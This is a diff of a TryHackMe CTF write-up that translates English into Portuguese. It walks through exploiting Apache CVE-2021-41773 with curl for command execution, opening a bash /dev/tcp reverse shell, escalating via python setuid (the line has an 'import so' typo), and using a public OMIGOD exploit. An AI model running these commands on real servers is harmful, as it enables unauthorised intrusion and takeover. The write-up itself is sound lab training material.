@@ -15,22 +15,20 @@ alt: "tryhackme"
 <hr>
 
 # Recon
-Let's start with a classic Nmap scan against the machine to see what services are running!
+Começando com Nmap, vamos enumerar a máquina para ver quais portas e serviços estão rodando no servidor.
 
 * -sC - Default Nmap scripts
 * -sV - Services version
 * -oA - Save output to a file
 * -v  - Verbose mode
 
-(This screenshot has another command because I typed it just for pic)
-
 ![nmap](/img/thm/ohmywebserver/nmap.png)
 
-Ok, we have two open ports, 80 port is running `Apache 2.4.49` and 22 port running a SSH. Can we access this webpage to see what we have.
+Apenas as portas 80 e 22 estão abertas, executando um Apache 2.4.4 e um SSH respectivamente. Então vamos começar pela aplicação web.
 
 ![consult](/img/thm/ohmywebserver/consult.png)
 
-Cool, just a web application. I didn't find anything interesting, so let's start a directory enumeration.
+A princípio não há nada demais, então podemos enumerar os diretórios usando o `ffuf`
 
 `ffuf -u http://10.10.148.87/FUZZ -w /path/to/wordlist -t 90 -c`
 
@@ -41,24 +39,23 @@ Cool, just a web application. I didn't find anything interesting, so let's start
 
 ![ffuf](/img/thm/ohmywebserver/ffuf.png)
 
-Here we find two somewhat interesting directories: `assets` and `cgi-bin`
+Encontrei dois diretório que podem ser interessantes: `assets` e `cgi-bin`
 
 ![assets](/img/thm/ohmywebserver/assets.png)
 
-Ok, I didn't find anything here too.
+Porém a princípio não havia nada de mais
 
 ![cgi-bin](/img/thm/ohmywebserver/cgi-bin.png)
 
 ## Reverse shell
 
-Alright, we have a cgi-bin, and coming back to Apache version I found something a lot interesting. For that apache version we have a `CVE-2021-41773`. Can we confirm it with a cURL command.
-Just sending a request with a linux command can we check it.
+Após não encontrar muita coisa, voltei nos resultados do Nmap e notei que a versão do Apache que estava sendo executada havia uma CVE: `CVE-2021-41773`. Podemos confirmar usando o cURL.
 
 `curl 'http://10.10.148.87/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'Content-Type: text/plain; echo; whoami && id'`
 
 ![curl-first-command](/img/thm/ohmywebserver/curl_first_command.png)
 
-BOOMM! We have a path traversal, and we are able to execute commands, so let's get a reverse shell with this. To do this we'll need two terminals, one for send request and another to wait a connection.
+Consegui um Path Traversal, no qual conseguimos executar comandos, então podemos usar o cURL e o netcat para estabelecer uma conexão reversa.
 
 `curl 'http://10.10.148.87/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash' -d "Content-Type: text/plain; echo; bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT/ <&1'"`
 
@@ -66,15 +63,15 @@ BOOMM! We have a path traversal, and we are able to execute commands, so let's g
 
 ## User
 
-Ok, we have a reverse shell and access to the machine, but there's no home user here
+Recebi a conexão, porém não tem nenhum usuário no sistema e também nenhum diretório home.
 
 ![no-user](/img/thm/ohmywebserver/no-user.png)
 
-It took me a while to enumerate this machine, so I decided to use linPEAS. So by uploading the script and running I found something interesting
+Após passar algum tempo procurando um ponto de partida decidi usar o linPEAS, e foi onde obtive a seguinte saída:
 
 ![linpeas](/img/thm/ohmywebserver/linpeas.png)
 
-We can set UID with python command.
+Com isso podemos setar o UID usando o python.
 
 `python3 -c 'import so; os.setuid(0); os.system("/bin/bash")'`
 
@@ -82,22 +79,22 @@ We can set UID with python command.
 
 ## Root
 
-After enumerating, I took a another look to linPEAS output and found something else: we have another IP address. So we can enumerate this IP with Nmap. Can you download nmap binary from [here](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64). Just upload as linPEAS.
+Após a enumeração olhei novamente a saída do linPEAS, e foi onde econtrei algo interessante: há outro endereço IP. Então podemos usar o Nmap para enumerar esse host. Você pode baixar o binário [aqui](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64).
 
 `nmap -v 172.17.0.0-5`
 
-This will scan IP from 0 to 5, and checking the output we can note that 172.17.0.1 host is up. 
+Esse comando vai fazer um scan do host 0 ao 5, e saída nos mostra que o host 172.17.0.1 está ativo.
 
 ![nmap_ntw](/img/thm/ohmywebserver/nmap_ntw.png)
 
-Enumerating it better we find another two open ports: `5985` and `5986`.
+Enumerando todas as 65535 portas o scan apontou duas portas abertas: `5985` e `5986`
 
 ![nmap_nports](/img/thm/ohmywebserver/nmap_nports.png) 
 
-Ok, we have another CVE: `CVE-2021-38647`. There's a script to exploit it, you can find it [here](https://github.com/AlteredSecurity/CVE-2021-38647). We'll use the python script to escalete our privileges.
+Com isso temos outra CVE: `CVE-2021-38647`, na qual podemos usar um script já pronto para explorar a falha. Você pode baixar o script [aqui](https://github.com/AlteredSecurity/CVE-2021-38647).
 
 ![omigod](/img/thm/ohmywebserver/omigod.png)
 
-Just run it by passing the command as an argument.
+O scrip executa comandos na máquina alvo, então podemos passá-los na execução como argumento, lendo a flag de root.
 
 ![root](/img/thm/ohmywebserver/root.png)
